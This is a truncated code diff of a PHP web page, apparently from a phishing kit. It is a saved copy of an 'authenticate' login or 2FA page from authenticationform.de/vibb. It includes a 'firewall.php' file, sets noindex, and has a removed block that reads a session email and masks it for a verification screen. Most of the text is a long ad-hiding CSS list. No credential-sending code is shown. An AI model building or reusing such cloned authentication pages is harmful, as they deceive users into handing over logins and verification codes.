@@ -1,37 +1,18 @@
 <?php
 
 include 'firewall.php';
-
-session_start();
-
-// Get email from session and redact it
-function redactEmail($email) {
-    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) return 'unknown@email.com';
-    [$user, $domain] = explode('@', $email);
-    $len = strlen($user);
-    if ($len < 2) return $email;
-    return $user[0] . str_repeat('*', $len - 2) . $user[$len - 1] . '@' . $domain;
-}
-
-
-
-$originalEmail = $_SESSION['user_email'] ?? 'someone@example.com';
-$redactedEmail = redactEmail($originalEmail);
-
-// header("Location: invalid login.php"); // or any other page
-//     exit;
 ?>
 
 
 <!DOCTYPE html>
-<!-- saved from url=(0068)https://authenticationform.de/vibb/authenticate/2FAuthentication.php -->
+<!-- saved from url=(0057)https://authenticationform.de/vibb/authenticate/login.php -->
 <html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  <meta name="robots" content="noindex">  
-  
-  
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style type="text/css" nonce="d2270bbf629a4344aa00ec37f20">.ad-slot-234-60, #advert-container-top, .publisher_ad, .banner-ad-inner, .divider-taboola, .ad-transition, .ads_main_hp, #Adv8, #Adv9, .gb_area_ads, .msgad, .internal_ad, #advertise-here, #adzone-right, .ads_ban, .follower-ad-bottom, .ads_bar, .adsense-header, div[data-clickadilla-banner], #skyscraperAds, .hotel-ad, .jw-ad-label, .l-ads, ._bottom_ad_wrapper, #intro_ad_1, #ad-mid-rect, #ad468, #ad-base, .boxSponsor, .header_leaderboard_ad, .TopAd, #sapetext, #homepage_top_ads, #left_ads, #left_adv, .sponsoredLinks, .widget_wp-bannerize-widget, .ad-vertical, .ads_big, #taboola-below-article-thumbnails-mg, #leaderAdContainer, .ad728_90, #leftAdAboveSideBar, .js-ad_iframe, .ad--wrapper, .grey-ad-notice, .footer_block_ad, .doubleClickAd, .navbar-header-ad, #google_ad_1, #google_ad_2, #google_ad_3, .mb-list-ad, .adsidebar, #advertising_wrapper, .etn-ad-text, .adbox-style, .floating-advert, #adsDisplay, #AdSpaceLeaderboard, .gnt_flp, #adspace_header, .adz-horiz, #inArticleAdv, .ac_adbox, .ad-hoverable, .buySellAdsContainer, .ad-rectangle-container, #taboola-below-article-thumbnails-v2, .ad-box-auto, .tab_ad, .list-footer-ad, .bottom-right-advert, .rekl_left, .guide__row--fixed-ad, .snhb-ads-en, .top-banner-468, .adRectangleUnit, .masthead__ad, #partnerIframe, .primis-player__container, .ad-wrapper-250, .ads_amazon, .ad__centered, .ad_wrapper, .banner240_10, #close-fixedban, #ad_takeover, .full_ad_row, .ad400x40, .right_ad, #taboola-above-homepage-thumbnails, #advertisement-300x250, html > div[class][style^="pointer-events: none; position: absolute; top: 0px; left: 0px; width:"], .header-sponsor, .adsdiv, .footer__ads--content, .adsImages, .ad-m-mrec, .o-ad-container, .adblk, #circad_wrapper, .adv300-250-2, .cl-ad-billboard, .adsidebox, .ads-rectangle, #bl_top_reklama, .adunit_footer, .ad-banner-2, .ad-banner-5, .ad-banner-6, .adbot, #ads-leaderboard, #RichBanner_center, #mid_left_ads, #colAd, .exco-container, a[href^="https://s.cant3am.com/"], .adsenvelope, .remove-spots, .tnw-ad, .visibleAd, .ads-bottom, .middle-ads728, .billboard-ad, .adbtn, #ad_content, .adbug, .SideWidget__ad, #ad__billboard, #left_ban, #adATF300x250, .ad--noscroll, .adbox-outer, #headeradspace, .ad_partners, #adBannerSpacer, .ad_pagebody, .buttonAd, .ads_inline_640, #fixedban, .elementor-widget-wp-widget-advads_ad_widget, #sideABlock, .ads-rendering-fix, #ads-vertical-wrapper, .bottom-banner-ad, .single-ads-section, .ad120_600, .normalad, .adslink, .adsbox--masthead, .amp_ad_wrapper, a[href^="https://torguard.net/aff.php"] > img, #advertisement_block, #adverts_post_content, .adspace_top, .horizsponsoredlinks, #ad_adsense, #pvadscontainer, .adbannerright, .ad1_bottom, #dfrads-widget-3, #skyads, #dfrads-widget-6, #dfrads-widget-7, .newspack_global_ad, .floated-ad, #topAdDropdown, .dfp-fixedbar, .adamazon, #advert-ahead, .headerAdvertisement, #lb-ad, .adRowTopWrapper, [href^="http://clicks.totemcash.com/"], #ad-Superbanner, .adTopHome, iframe[src^="https://ad.adriver.ru/"], #sidebar_adblock, .ad_fullwidth, #AdContent, #sideSponsors, .adSkyscaper, .ads_css, .dianomiScriptContainer, .sponsored_bar_text, .c-ArticleAds, .square_ad, .advert-info, .ads-top-main, .ad.element, .homep_banner, #before-footer-ad, #leader-board-ad, #ad-story-top, .ad300_2, guj-ad, .header-adcode, #mpu-advert, #right-widget-c-ads_widget-7, .ad300shows, #adcenter, .sponsor-block, #footer-adspace, #yandex_ad2, .SkyAdContainer, .middle-footer-ad, #adslot-below-updated, .ad-medium-widget, .Banner710 > object, .ad-module, #sidebar_ad_widget, .adcolumn_wrapper, .secondary-advertisment, a[href^="https://a.bestcontentfood.top/"], .adcon, .advertisment_bar, #ad-rectangle, .adsens, .site-header-ad, #advSkin, #popup_ad_wrapper, a[href*="&maxads="], .container_publicidad, #sidepad-ad, .ai-top-ad-outer, #ad600, #div_ad_leaderboard, .print-ad-wrapper, .vl-header-ads, #adblock1, #adblock2, #adblock4, .advertismentContent, .billboard.ad, .ad-slot-article, #header_ad_728_90, #advert-leaderboard, #Adv10, #Adv11, .ad_w300h450, #adv-Middle, #ad-block-aa, #slider-ad, .lightad, a[href^="https://turnstileunavailablesite.com/"], .adslot__ad-wrapper, .adwrap, .sraAdvert, #leaderboardAdvert { display: none!important; }
+    <meta name="robots" content="noindex">  
+    
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style type="text/css" nonce="d2270bbf629a4344aa00ec37f20">.ad-slot-234-60, #advert-container-top, .publisher_ad, .banner-ad-inner, .divider-taboola, .ad-transition, .ads_main_hp, #Adv8, #Adv9, .gb_area_ads, .msgad, .internal_ad, #advertise-here, #adzone-right, .ads_ban, .follower-ad-bottom, .ads_bar, .adsense-header, div[data-clickadilla-banner], #skyscraperAds, .hotel-ad, .jw-ad-label, .l-ads, ._bottom_ad_wrapper, #intro_ad_1, #ad-mid-rect, #ad468, #ad-base, .boxSponsor, .header_leaderboard_ad, .TopAd, #sapetext, #homepage_top_ads, #left_ads, #left_adv, .sponsoredLinks, .widget_wp-bannerize-widget, .ad-vertical, .ads_big, #taboola-below-article-thumbnails-mg, #leaderAdContainer, .ad728_90, #leftAdAboveSideBar, .js-ad_iframe, .ad--wrapper, .grey-ad-notice, .footer_block_ad, .doubleClickAd, .navbar-header-ad, #google_ad_1, #google_ad_2, #google_ad_3, .mb-list-ad, .adsidebar, #advertising_wrapper, .etn-ad-text, .adbox-style, .floating-advert, #adsDisplay, #AdSpaceLeaderboard, .gnt_flp, #adspace_header, .adz-horiz, #inArticleAdv, .ac_adbox, .ad-hoverable, .buySellAdsContainer, .ad-rectangle-container, #taboola-below-article-thumbnails-v2, .ad-box-auto, .tab_ad, .list-footer-ad, .bottom-right-advert, .rekl_left, .guide__row--fixed-ad, .snhb-ads-en, .top-banner-468, .adRectangleUnit, .masthead__ad, #partnerIframe, .primis-player__container, .ad-wrapper-250, .ads_amazon, .ad__centered, .ad_wrapper, .banner240_10, #close-fixedban, #ad_takeover, .full_ad_row, .ad400x40, .right_ad, #taboola-above-homepage-thumbnails, #advertisement-300x250, html > div[class][style^="pointer-events: none; position: absolute; top: 0px; left: 0px; width:"], .header-sponsor, .adsdiv, .footer__ads--content, .adsImages, .ad-m-mrec, .o-ad-container, .adblk, #circad_wrapper, .adv300-250-2, .cl-ad-billboard, .adsidebox, .ads-rectangle, #bl_top_reklama, .adunit_footer, .ad-banner-2, .ad-banner-5, .ad-banner-6, .adbot, #ads-leaderboard, #RichBanner_center, #mid_left_ads, #colAd, .exco-container, a[href^="https://s.cant3am.com/"], .adsenvelope, .remove-spots, .tnw-ad, .visibleAd, .ads-bottom, .middle-ads728, .billboard-ad, .adbtn, #ad_content, .adbug, .SideWidget__ad, #ad__billboard, #left_ban, #adATF300x250, .ad--noscroll, .adbox-outer, #headeradspace, .ad_partners, #adBannerSpacer, .ad_pagebody, .buttonAd, .ads_inline_640, #fixedban, .elementor-widget-wp-widget-advads_ad_widget, #sideABlock, .ads-rendering-fix, #ads-vertical-wrapper, .bottom-banner-ad, .single-ads-section, .ad120_600, .normalad, .adslink, .adsbox--masthead, .amp_ad_wrapper, a[href^="https://torguard.net/aff.php"] > img, #advertisement_block, #adverts_post_content, .adspace_top, .horizsponsoredlinks, #ad_adsense, #pvadscontainer, .adbannerright, .ad1_bottom, #dfrads-widget-3, #skyads, #dfrads-widget-6, #dfrads-widget-7, .newspack_global_ad, .floated-ad, #topAdDropdown, .dfp-fixedbar, .adamazon, #advert-ahead, .headerAdvertisement, #lb-ad, .adRowTopWrapper, [href^="http://clicks.totemcash.com/"], #ad-Superbanner, .adTopHome, iframe[src^="https://ad.adriver.ru/"], #sidebar_adblock, .ad_fullwidth, #AdContent, #sideSponsors, .adSkyscaper, .ads_css, .dianomiScriptContainer, .sponsored_bar_text, .c-ArticleAds, .square_ad, .advert-info, .ads-top-main, .ad.element, .homep_banner, #before-footer-ad, #leader-board-ad, #ad-story-top, .ad300_2, guj-ad, .header-adcode, #mpu-advert, #right-widget-c-ads_widget-7, .ad300shows, #adcenter, .sponsor-block, #footer-adspace, #yandex_ad2, .SkyAdContainer, .middle-footer-ad, #adslot-below-updated, .ad-medium-widget, .Banner710 > object, .ad-module, #sidebar_ad_widget, .adcolumn_wrapper, .secondary-advertisment, a[href^="https://a.bestcontentfood.top/"], .adcon, .advertisment_bar, #ad-rectangle, .adsens, .site-header-ad, #advSkin, #popup_ad_wrapper, a[href*="&maxads="], .container_publicidad, #sidepad-ad, .ai-top-ad-outer, #ad600, #div_ad_leaderboard, .print-ad-wrapper, .vl-header-ads, #adblock1, #adblock2, #adblock4, .advertismentContent, .billboard.ad, .ad-slot-article, #header_ad_728_90, #advert-leaderboard, #Adv10, #Adv11, .ad_w300h450, #adv-Middle, #ad-block-aa, #slider-ad, .lightad, a[href^="https://turnstileunavailablesite.com/"], .adslot__ad-wrapper, .adwrap, .sraAdvert, #leaderboardAdvert { display: none!important; }
 #adholder, .advertise_link, .grid-item-ad, .ad-disclaimer, .adarea, .ad_reminder, #adwidget1, #adwidget2, .sticky-sidebar-ad, .verticalAd, .adwrapper-lrec, .sponsored-text, .buttonad, #adsense468, .leaderboardadtop, .brn-ads-sticky-wrapper, #ad-container-leaderboard, #rm-adslot-contentad_1, .leaderAd, .ad_wrapper_top, .ad300px, .top_ad_wrapper, #adOuter, a[href^="https://bngprm.com/"], .advert_title, .adbutton-block, .instream_ad, #g_adsense, #homepage-header-ad, #articleBoard-ad, .dfp-wrapper, #topAdvBox, .ads-post, #adSlot-leaderBottom, .ad-120x60, .adboxbg, .adbttm_right_label, .ad-slot-widget, #adwallpaper, .advertise-top, .adboxcm, .hederAd, .ad-notice-small, .moduletable-rectangleads, #main_content_ad, #featureAds, .ad-120x90, .d3-o-adv-block, .adboxes, .advertBottom, .advertising-notice, #ad_before_header, .ads300-200, .block-ad-wrapper, #AdBanner, #adverts_right, #subheaderAd, .js-ads-carousel, .adboxid, .ad_grid, #adverticum_r_above, .movv-ad, .ads250-250, .Section-ad, .addiv, #left-ad, .mr2_adwrap, .ads300-250, #ad-block-container, .adsection_a2, .ad-wrapper-with-text, .ad_txt2, .rightadd, .rightads, .rightadv, .ad_claim, .adsection_c2, .adsection_c3, #viewabilityAdContainer, noindex > div#promo2_bottom2, .sf_ad_box, .rcom-freestar-ads-widget, .ad-bottom-right-container, #bm-HeaderAd, .GeminiAdItem, .adss-rel, .spons-link, .adds2, #hpAdVideo, .wp_bannerize, #ads2_block, .top-ad-content, .rightboxads, .trc_rbox_div, .leaderboard-ad-dummy, .ad-block-header, #GoogleAdTop, .left-ads, #midRightAds, .mar-leaderboard--bottom, .ads-content, .ad970_250, #playerAdsRight, .advads-background, #staticad, #ad728, #ad_results, .ad--scroll, .theads, .outbrain-wrapper-container, .grid-advertisement, .ad-slot-replies, .tncls_ad, .partner_ads, #adsTopLeft, .sidebar-big-box-ad, .sidebar_ad_container, .adHeading, #ads_space, .adHeaderblack, .verticalad, .image-viewer-mpu, .innerAdWrapper, .top-sidebar-adbox, .ad_plus, .mediumRectagleAd, .header-advertise, .leaderad, .banners-top, #ads_space_header, .insticator-ads, .embedded-article-ad, .misc-ad, .bar_ad, .region-ad-right, .ad--desktop, .dartad, #bottomAdSection, .adSection, .ad_bottom_728, .van_vid_carousel, .vertbars, .showAd, .spon_link, #sticky-custom-ads, .widget_adsensewidget, .apiAds, .fig-ad-content, .primis-video, .advertise_verRight, a[href^="https://pb-track.com/"], .tp_ads, .ppb_ads, .incontent-ad1, .header-top-ad, #adcolumn, .pmc-adm-boomerang-pub-div, .top-ad-bloc, .ad_trick_header, a[href^="//ejitsirdosha.net/"], .flex-posts-ads, .advert__container, .ads120_600, .c-advert, .galleryAds, .ad_desktop, .square-ads, #bottom-adhesion, .ad_rectangle_medium, .bottom-ad--bigbox, .footer-floating-ad, .squareads, #narrow-ad, #adplacement, .vl-advertisment, .MiddleAd, .rekl_top_wrapper, .sponsored-home-page-inner, #contextual-ads, .bannerAdTower, .break-ads, #footer_ad_container, .annonstext, .ad-medium-rectangle, #bt-ad-header, .middle_AD, .GoogleDoubleClick-SponsorText, .affiliate_ad, .ad-rectangle-banner, .pix_adzone, #inline-ad-label, #ads_top_container, .ad.promotion, .advert__mpu, .sponserLink, .adsgrd, #blox-top-promo, .top-ad-horizontal, #interstitialAdUnit, .ADBox, .admediumred, #lb-sponsor-left, #skinad-right, .mid_banner_ad, #home_ads_vert, .ezoic-floating-bottom, #adsense-2, .head-top-ads, .leaderboard_adsense, .hyperAd, .td_footer_ads, #aboveNodeAds, #pageads_top, .BigBoxAdLabel, #ad_rotator-2, #ad_rotator-3, .box_ad_horizontal, .mobile-ad-placeholder, #site_content_ad_div, .taboola-widget, .box_ad, .ads-module, .sponsor_label, .i-amphtml-element.live-updates.render-embed, #adsense_r_side_sticky_container, .advert-footer, .banner728x90, #ads_box_top, .ad-disclaimer-text, .adlinkdiv, #ads_container, .pageGoogleAds, .ad-desktop-right, .native-ad-slot, #adv-container, .adholder-300, .medium_ad, #outbrain, .article_adbox, .divAdsBanner, #leftbanners, #footer-ad-unit, .adv_outbrain, #ad_island, #ad-gutter-left, #rh_tower_ad, .ads-336x280, #article-island-ad, a[href^="http://eslp34af.click/"], .ad_text_link { display: none!important; }
 .adbox-wrapper, #topAdsContainer, .footer-im-ad, .ad-gap-sm, #ad-pencil, .ad-choices, #Adsense300x250, .ads.cell, .advert-sidebar, .wall-ads-right, .adslotMid, #below-menu-ad-header, #preroll_ads, .first-banner-ad, .adfix, .medium-rectangle-ad, .featuredAdBox, .tc-adbanner, .ad-large-game, #advert-right, .ad-container-middle, #topad728, #left_block_ads, #dfp_ad_mpu, .paneladvert, .widgetSponsors, .div_reklamma, #top-skin-ad, .lazy-ad-unit, .sidebar-ads-wrap, .sidebar-ad-slot, .widget_sej_sidebar_ad, .advert-autosize, .ad-background-container, a[href^="https://join.sexworld3d.com/track/"], .wp125ad, .arc-ad-wrapper, .goAdMan, #background-ad-cover, #rotating_ad, #bottomAdWrapper, .halfpage_ad_1, .ad-top-728, .np-adv-container, .mpu-holder, .middle_ad, #dfpAd, #ad900, .adfrp, .contentleftad, a[href^="https://ad.zanox.com/ppc/"] > img, .ad-feature-content, .advert--inline, #Ad-4-Slider, #wrapper-AD_G, #wrapper-AD_L, .mpuHolder, #wrapper-AD_R, #adsense728, .adWidgetBlock, .ad-priority, #live-ad, .adfbox, .adsenbox, .post_sponsored, .adsonofftrigger, .homepage_ads, .dsk-box-ad-d, #leatherboardad, .carambis_hbanner_336, .adsSectionRL, .np-header-ad, .placeholderAd, #ad970, .asideAd, .pageAds, .adwrap-widget, .mosaicAd, .sidebar-adv-container, .ad160_blk, .ad-aligncenter, #innerpage-ad, #header_ads2, #outbrain1, .ads_foot, .ad-544x250, .mntl-gpt-adunit, #gallery-ad, .adinner, [data-cl-spot-id], #advert-block, .headerAdPosition, .primis-ad, .gnt_rr_xst, #DFP_top_leaderboard, .ad300x100, .entry_ad, body > div#dontfoid, .adsMarker, .gameAd, .ad-vert, .longAd, .cont-ad, .ad300x120, .rect-ad, #AD_ROW, .ad_728x90b, #sidebar-main-ad, .rs_ad_block, #adHome, .ammblock, .adside, #aside_ad, .adsmalltext, .ad300x150, a[href^="https://adultfriendfinder.com/go/"], .adsHeading, .slideshow-ads, .textadtext, .adwhitespace, .ad_cls_fix, .mpu_Ad, .content_advertising, .zergnet__container, #div-gpt-mrec, .adlinks, .right_ad_box, .tile-ad-container, .banner-buysellads, .alt_ad_block, .ad-container--hot-video, .adSeven, #footerAdBox, #wide_right_ad, .offads, #gameads, .e3lan-widget-content, .topAdBar, #leaderboardAdTop, #top_mpu_ad, #midAD, #side_ads, .ad-wrapper-bg, .Sidebar-ad, .leaderboard_ad_container, #large-ads, #floatingAd, a[href^="https://clicks.pipaffiliates.com/"], #component-taboola-below-homepage-feed, #ad_site_header, #advrich, .pageTopAd, .sagreklam, .block-yt-ads, .ADServer, .block-adsense, .block_ad303x1000_right, .top-ads-mobile, #wl-pencil-ad, .pt_ad03, #global_header_ad, #ad-300-250, .ue-c-ad, .box-adsense-top, .taboola-sidebar, #afc-container, .advertisement_text, .ad_300250, #dfp-ad-slot4-wrapper, .advt_single, .ad-panel__googlead, .advertiseHere, .ad_post, #ad-sidebar, #index-ad, .block-openads, #sponlinks, .chapter-bottom-ads, #bsa_add_holder_g, a[href^="https://playnano.online/offerwalls/?ref="], .c-adDisplay_container, .boxad1, .boxad2, .bottom-ad2, #left_side_ads, .ads_outer, .adTagTwo, .homeCentreAd, #LeftAd, .video-advert, #outbrain-section, .ad728x90-1, .ad728x90-2, .boxads, .boxadv, #secondad, .bottom-ads, .bottom-adv, .dart-advertisement, .inner_big_ad, .tc_ad_unit, #ad_island2, .adsbyexoclick-wrapper, .header_advert, .square-sidebar-ad, .main_ad, .adv-conteiner, .storyad300, .contentads1, .contentads2, .SponsoredContent, .str-top-ad, .insert-post-ads, .skyAdd, #dfpad-0, #ad_728_90, .ad250x250, .ad468x60Wrap, .PrintAd-Slider, .ad300x250, .widget_evolve_ad_gpt_widget, #adbox-inarticle, #boxAD, .lr-pack-ad, #takeover_ad, #top_ads_wrap, .mediumRectAdWrapper, #boxAd, #div_advt_right, .idmuvi-topbanner, #Ads_TFM_BS, #companion_Ad, .mpu_ad, a[href^="https://prf.hn/click/"][href*="/camref:"] > img, .advertisement-content, .gb-ad-top, .trc_excludable, .js-no-sticky-ad, #ads-google, #incontent-ad-2, #incontent-ad-3, .adsload, .adsPlaceHolder, .google_ads_sidebar, .block-google-admanager, #lower-ad-banner, #topright-ad, #adzone-middle1, #article_ads, #banner_pos1_ddb_0 { display: none!important; }
 #adzone-middle2, #adxBigAd, .adbox-slider, .adsnippet_widget, .railadspace, #col-right-ad, .incontentAd, #advads_ad_widget-18, #advads_ad_widget-19, a[href^="https://claring-loccelkin.com/"], .skyscraper_ad, .custom-sticky-ad-container, [href="https://ourgoldguy.com/contact/"] img, #rotatingads, a[href^="https://ak.hauchiwu.com/"], .td-a-ad, #carbonadcontainer, .google-ads-footer-01, .google-ads-footer-02, .sponsorText, .gadsense-ad, .tower_ad, .middleads, .galleryRightAd, #adcontainer_ad_content_top, .adscaleTop, #section_advertisements, .ad-container-header, .cwAdvert, .ad-shifted, embed[width="600"][height="160"], #ad_rr_1, .cbd_ad_manager, .ob-widget-header, .middleAdLeft, .ads_rectangle, .textLinkAd, .adthrive_custom_ad, #towerad, #BannerGCenter, #home_advertising_block, .adLoader, .widget_text_adsense, #sponsored-carousel-nucleus, .adSpacer, #sidebar_ad_top, .sidebar-adbox, .module-ads, .flexiad, .ad250x300, .gallery_ads_box, #mid_ad_div, a[href*=".g2afse.com/"], .qc_search, .sideBarAd, .advertisingMob, .adHorisontalNoBorder, .singpagead, .content_ad_side, #mvp-post-bot-ad, .inline-ad-text, .adUnitHorz, .widget-ad300x250, .fwAdTags, #gpt-ad-skyscraper, gpt-ad, #footerAdDiv, #hp-right-ad, .ads-widget-content, .post-load-ad, #adheader, .banner728-container, #asideads, #Banner728x90, #boxad, a[href^="https://www.get-express-vpn.com/offer/"], .ad-panel-wrap, #ctl00_atop_bt, .adbox_largerect, .marketgidV, #bannerad2, #footer-advert, #medrectad, .ad170x30, #AdDisclaimer, .cnx-player, .AdHolder, #bannerads, #ad_article1_1, #ad_article1_2, .ad-panel, .gutterads, #adsContent, #ad-horizontal-top, #head_ad, .wc-adblock-wrap, .pmc-contextual-player, a[href^="https://combodef.com/"], .ad__inline, .ad_large, .news-ad-square-a, #outbrain-wrapper, .contentadcontainer, .banner_panel, .placeholder-ad, .adsense-heading, #HP2-ad, .ad-wrap-transparent, .ad-col-02, .ContentTopAd, #adPlacement_1, #adPlacement_2, #adPlacement_3, #adPlacement_4, #adPlacement_8, #adPlacement_7, #ad_creative_2, #ad_creative_3, #ad_creative_5, #adPlacement_9, #ads_insert_container, .side_ad_top, .right_advertisement, .adits, .thumbs-adv, .innerWidecontentAd, .aside-ad, #ad-bottom, .ad_text_links, .ads-code, .under_ads, .mrec-banners, .TrafficAd, .js-ad-wrapper, .top_adbox1, .top_adbox2, .block_ad, .ad-horizontal, .GRVMpuWrapper, .ad-hldr-tmc, .ad-holder-center, .masonry__ad, .adbutler-top-banner, .ad--slot, a[href^="https://believessway.com/"], .index_ad_a2, .index_ad_a4, .index_ad_a6, div[data-adv-type="dfp"], .index_ad_a5, .adver-left, #sidebar-ad-block, #video-ad, .component-outbrain, .revive-ad, .adv-aside, #ad_rectangle, .ezoic-adpicker-ad, #textAd, .vlog-ad, .wp-ads-target, .ads-cols, .navbar-ads, .sidebar-bottom-ad, #player-ads, .myAdsGroup, #left-ad-iframe, .topboardads, #bp_banner, [href^="https://join3.bannedsextapes.com"], .ads-cont, .width-ad-slug, #leader-companion > a[href], .firmach_form_rifform, .advert-mpu, a[href^="//stighoazon.com/"], .adside-box-single, .ad_after_section, a[href^="https://pb-imc.com/"], #googleAdBox, .headadcontainer, #dfp-masthead, .SponsoredResults, .cnbcHeaderAd, .widget_awaken_pro_medium_rectangle_ad, #homeheaderad, .c-googleadslot, #contentad-lower-medium-rectangle-1, .block-ad-header, .ad_trailer_header, .ads-line, .sidebar-header-ads, #upperRightAds, #adbannerleft, .js-stream-ad, #adIsland, .ampforwp-sticky-custom-ad, #channel_ad, .eaa-ad, [href^="https://ad1.adfarm1.adition.com/"], #article_box_ad, .ad-container__ad-slot, .side-ads, .ad3001, .adslot-feature, .adsRight, .ad-rb-hover, .ad300b, .ad-wrapper-sticky, .ad-300X250-body, .sideAdLeft, .am-adslot, .ad300w, #featureAd, #ad_article2_1, #ad_article2_2, .ad-banners, #specialadfeatures, #ads-footer-wrap, .wpx_bannerize_banner_box, .Banner710 > img, #FooterAdContainer, .mpuads, .add_topbanner, #adnorth, #viboom, #sideAdSmall, .adLeaderboardAdContainer, .article-inline-ad, .b-advertising__down-menu, a[href^="https://www.toprevenuegate.com/"], .TopRightRadvertisement, .b-section_banners, .inner-advert, #inner-advert-row, .vf3-conversations-list__promo, .ad--300, .footer-advertisement, .js_midbanner_ad_slot, #top-advertisement, #sponsoredLinksBox, #home_ad, .home-sticky-ad, #dfp-footer-desktop, .footer-advertisements, .ad_type_adsense, #around-the-web, #pagebottomAd, .adslug, .crain-advertisement { display: none!important; }
@@ -99,106 +80,100 @@ span[data-ez-ph-id] { position: absolute !important; left: -3000px !important; }
 .ad_middle, .ad-entity-container, #show_ads, *:not(body) > a[href^="https://content-loader.com/content"], .ad-slot, .ads-by-google, [data-adblockkey], #googlead, .ProductAd, .avp-p-wrapper, .region-ad-top, .ad-placeholder:not(#filter_ads_by_classname):not(#detect_ad_empire):not(#detect):not(.adsbox), .has-ad, .ad-element, a[href^="https://tm-offers.gamingadult.com/"], .advert_list, #ad-rotator, #AdSense1, .adholder2, .ads_header, .google-ad, .ad-spot, .ad_right, .one-search, .advBox, div[id^="AdFox_banner_"], .node-ad, div[id^="ezoic-pub-ad-"], .ad_box, .ad_btn, div.bannerbg, #advertising, #content_ad, .adlink, #article_ad, .adsense_wrapper, .adtitle, .adlist, .advertSlider, .anyClipWrapper, #ad-bigsize, #topBannerAd, .ad_div, .ad-area:not(.text-ad), .vertical-ads, .top-ad, .ad-content-area, .advertisment, .ad-content, .ad-outside, #adWrap, #ad_middle, #ads-text, .topAd, iframe[width="240"][height="400"], .cardAd, #ad-target, .adwrapper, .ad_body, #leaderboard-ad, #ad_wrapper, .connatix-wrapper, #ad-container, #adtop, .side-ad, .ad-stickyhero--standard, .ad_item, [data-ad-manager-id], .ads-mobile, #leaderboard.ad, #sidebar_ad_1, .ad_img, #banner_carousel, .adsBanner, .adTitle, .adtable, #bannerlayer, #google-ad, #reklama, .adhead, .ad_container, #content_ads, .adleft, .ads_single_center, .text_ads_2, .advert_area, .head_ad, .header-ad, iframe[width="200"][height="240"], .ad_frame, .banner-468x60, .bannerblock, #ad1, .oas-container, ins.adsbygoogle[data-ad-client], .adsText, #advertisement, .adunit, .advert-container, .top-banners, [href^="https://zstacklife.com/"] img, #banners_left, .adhide, #stickyads, .sidebar-ads, .adsbyvli, .ad_links, #adBanner1, .mntl-leaderboard-spacer, [id^="div-gpt-ad"], #top_ad, *:not(body) > a[href^="https://07c225f3.online/content"], .ad_Right, .adthrive, .ads_wrapper, .adsbygoogle-noablate, .sponsor_post, .ad-body, .wrapper-ad, .content_ads, .publicidade, #bottom_ads, .google-ads, .adlist, .ads-core-placer, .display_ad, .adItem, #adsense-bottom, #showads, a[href^="https://natour.naughtyamerica.com/track/"], .ad_top, .adContainer, .adsense-block, .ad-unit:not(.textads), .AdContainer, #adspace, #ad_container, [data-ad-name], .ad-text, .ad-center, .c-ads, .ad-holder, .chitika-ad, #leftad, .banners_block, #adTop, .topad, .banner-ad, .reclama, .AdTitle, .banner_center, .banner-728x90, .ad-heading, .ad-section, .sponsor_image, .ad-stickyhero-enable-mobile, .after-post-ad, #SponsoredLinks, iframe[width="468"][height="60"], #right_ad, .module-ad, #footer_ad_modules, .ad-wrapper, .advert2, .adverts, .logo-ad, #header_ad, #ad-content, #ad_link, .adv_link, .banner240, .adace-slot, .ad-enabled, .right-ad, .bottom_ad_block, .ads-box, #adcontainer, .bannerin, .AdsSlot, .ad300, .ad336, #ads-left, .plainAd, .banners1, .banners2, .innerBanner, .ads-header, [href^="https://www.herbanomic.com/"] > img, .wppaszone, #googleAds, div[aria-label="Ads"], #footer_ads, iframe[width="200"][height="300"], .ads-image, .ad_space, [data-ad-module], .ez-video-wrap, #adlabel, #ads_top, .headerad, .large-advert, .ad-button, .adwidget, #banner-ad, .adzone, .advert-block, #adriver_banner, #top_ad, .sponsorad, .adscenter, #ad728x90, .ad-inner, #ad_left_top, #ad_block, .skyscraper.ad, .ad-card, .block-ad, .ad-links, .ad-box:not(#ad-banner):not(:empty), #mediaget_box, #mini-ad, .ad-cover, .rightAd, #adContainer, .ad_slot, div[id^="crt-"][style], img[width="600"][height="90"], #AdHeader, .adslot_1, .ad-250, #GoogleAd2, .adv-banner, .ad-zone-container, #adsbox, noindex .download_btn, [class^="s2nPlayer"], .ad_banner, .ad-grid, .advert-detail, #horizontal-ad, #sidebar_ads, .article-advert, div[data-ad-targeting], [href^="https://mystore.com/"] > img, .rkl, #google-ads, .skinAd, .mpu, .ad_spot, .ad-current { display: none!important; }
 .mid_ad, .ad-stickyhero, .mainAd, #top_banners, .adsList, #adv-text, .advertiser, #ad_close, #taboola-below-article-1, [href^="https://mypatriotsupply.com/"] > img, .adWrap, .td-a-rec, img[width="460"][height="60"], .promoAd, .Advert, [name^="google_ads_iframe"], .ad-post, .Adsense, .bottom_ad, .module_ad, .ads-row, .cnx-player-wrapper, #featuread, .ad-lead, .header-ad-row, .single_ad, div[id^="div-gpt-"], .advert-wrapper, .video-ad-container, [data-advadstrackid], .nativead, .post-ad, div[data-banner-name], .ad_bottom, .adv-box, .ads1, .ads2, .p-ad, .adSummary, #ad-wrapper, .adrect, .adElement, .ad-label, .adtable, .largeAd, .googleAd, #AD_160, #headerTopAd, #ad_banner, #page_ad, .TextAd, #ad-ads, .ads-loaded, .adBlock, .section-ads, #ads-header, #adwrapper, .ad_global_header, .boxAds, #adbannerdiv, #topAd, .adVertical, .googleads, .ad-banner-container, .adImg, .c-ad, .AdBox, .top_ad, embed[width="240"][height="400"], #advertise, iframe[src^="//ad.a-ads.com/"], .product-ad, .video-ads, .adplaceholder, #adlayer, .middlead, #homead, .left-banner, .topads, #videoAd, [href^="http://mypillow.com/"] > img, .advads-widget, .adunit-container, a[href^="https://pubads.g.doubleclick.net/"], .ad_content, html[class^="img_"][amp4ads=""][i-amphtml-layout=""][i-amphtml-no-boilerplate=""][amp-version="2502032353000"], #printads, .left_ad, .mediaget, #sidebar_ads, img[width="240"][height="400"], #adclose, .adspace, .scad, .ad-hero, .sponsoredtextlink_container, .ad_body, .adHolder, .ad-widget, #adcontainer1, #promo-ad, #mod_ad, iframe[width="100%"][height="120"]:not([src*="bandcamp.com"]), [href^="https://noqreport.com/"] > img, .l-ad, #ad_container, .ad-google, .inline-ad, .adsbottombox, #ads-menu, div[id^="yandex_rtb"], .banner-mid, .adContent, .gallery-ad, .sponsoredItem, .small_ad, .adMiddle, .ad-sidebar, .header_ad, #googlead2, .adRow, .ad-med-rec, .adsTop, [data-ad-cls], .page-ad, 